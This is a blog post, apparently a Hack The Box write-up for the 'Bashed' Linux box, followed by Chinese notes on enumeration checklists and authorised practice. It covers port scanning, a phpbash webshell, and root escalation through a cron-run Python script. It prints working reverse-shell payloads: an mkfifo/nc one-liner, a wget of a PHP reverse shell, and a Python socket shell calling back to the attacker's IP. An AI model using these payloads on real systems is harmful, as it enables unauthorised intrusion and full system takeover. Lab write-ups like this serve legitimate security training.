---
title: "Bashed -- hack the box"
author: Neal
summary: "本文围绕《Bashed -- hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。"
cover: "/img/post-covers/bashed-hack-the-box-e4871f5bea.jpg"
tags: [安全, 渗透测试, HTB]
categories: [htb]
date: "2019-04-04"
lastmod: "2026-08-08"
---



> **（原外链配图已失效移除，请以正文说明为准）**



## Introduction

Target: 10.10.10.68 (OS: Linux)

Kali linux: 10.10.16.44

## Information Enumeration

Firstly, detect the open ports:

```    
# Nmap 7.70 scan initiated Wed Apr  3 20:48:43 2019 as: nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.68
Warning: 10.10.10.68 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.68
Host is up (0.31s latency).
Not shown: 39680 closed ports, 25854 filtered ports
PORT   STATE SERVICE
80/tcp open  http
```

Only port 80 is open, it may be an easy box. And the truth is that it is really an easy box.

Then, detect the services of the port 80, it may be a kind of http service.

```
# Nmap 7.70 scan initiated Wed Apr  3 20:55:27 2019 as: nmap -sC -sV -p 80 -oA services 10.10.10.68
Nmap scan report for 10.10.10.68
Host is up (0.35s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

Nothing special. Then access the http service and find more.

## Exploit

### Http

Access to `http://10.10.10.68`, and it seems to be a simple blog which talks about `phpbash`.



> **（原外链配图已失效移除，请以正文说明为准）**



`phpbash` seems to be a webshell tool. And there is a github repository [phpbash](https://github.com/Arrexel/phpbash) introduces the tool. The introduction of the repo is to drop the file to target and access it by `http://ip/uploads/phpbash.php`. Try to access `http://10.10.10.68/uploads/phpbash.php`. But the file seems not to be here.

Utilize the dirbuster to enumerate the directories.



> **（原外链配图已失效移除，请以正文说明为准）**



Wow. Find it and open the file `phpbash.php`. Here is the webshell. I have tried to reverse shell by `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.44 1234 >/tmp/f`. But the shell cannot be returned. Whatever, I can obtain the user.txt.



> **（原外链配图已失效移除，请以正文说明为准）**



It is convenient to get the reverse shell. So I try to upload a php shell to the target machine. The detailed php script can be found [here](https://github.com/neal1991/htb/blob/master/Bashed/php-reverse-shell.php). And I server the php script by `python -m SimpleHTTPServer 80`. Then download the php script from the target machine. To ensure the script can be written to the target machine. Select a path can be written, for example: `/tmp`.



> **（原外链配图已失效移除，请以正文说明为准）**



`wget http://10.10.16.44/php-reverse-shell.php`

Then in the kali, set the `nc` listen to port 1234:

`nc -lvnp 1234`

Execute the php script in the target machine `php php-reverse-shell.php`. OK. We obtain the reverse shell.



> **（原外链配图已失效移除，请以正文说明为准）**



## Privilege escalation

Obtain the user permission is quite easy, and it is not difficult to obtain the root permission. Utilize `sudo -l` to see the permissions of the user. Something interesting found. We can switch to `scriptmanager` user without password.



> **（原外链配图已失效移除，请以正文说明为准）**



```
su -u scrriptmanager bash -i
```

Try to enumerate the files. And I find an interesting folder inside `/scripts`. There are two files `test.py` and `test.txt`. Try to display the content of `test.py`.



> **（原外链配图已失效移除，请以正文说明为准）**



The python script is quite straightforward. It just writes `testing 123!` to the file `test.txt`. And if we see the attributes of `test.txt`, the modified time of the file changes each minute. And the file is owned by root. It seems that `root` will execute the python scripts in `/scripts` folder each minute. So utilize a python script to reverse the root shell(according to the information above, the python version of the target machine is 2.7):

```python 
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.16.44",4444));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

Set the kali listen to port 4444. Download the python script in the target machine and execute. Now, root shell is obtained.



> **（原外链配图已失效移除，请以正文说明为准）**

## 练习要点

Bashed 一类箱子常强调：

- Web 目录下的意外脚本/webshell 入口  
- 低权限用户横向到更高组  
- 本机枚举（sudo、SUID、定时任务）  

## Writeup 规范

1. 只记录授权靶场过程  
2. 截图失效时以命令输出代替  
3. 总结「哪一步枚举本可更快发现」  

## 小结

初始访问往往藏在「看起来无关」的虚拟主机或脚本目录里。提权前把用户与组关系画清楚，能少走弯路。


## 枚举清单（可复用）

1. 全端口与版本探测  
2. HTTP 标题、技术栈、目录字典  
3. 可能的虚拟主机  
4. 默认口令与公开 exploit 检索  
5. 低权 shell 后：`id`、`sudo -l`、定时任务、SUID、内核  

每一步记下「排除了什么」，writeup 才有复盘价值。靶场通关后花 10 分钟整理思维导图，下次同类盒子会显著更快。


## 延伸阅读与实践

把文章里的命令和配置放到自己的实验环境跑一遍，比只看结论更重要。建议同步记录：环境版本、失败现象、最终生效的配置。下次遇到同类问题时，检索自己的笔记往往比搜引擎更快。

若该主题涉及安全测试，请仅在明确授权的系统或官方靶场中操作，并保留测试范围与时间窗记录，避免对生产造成误伤。

对团队分享时，用「问题—影响—修复—验证」四段结构复述，有助于把个人经验沉淀为组织能力。
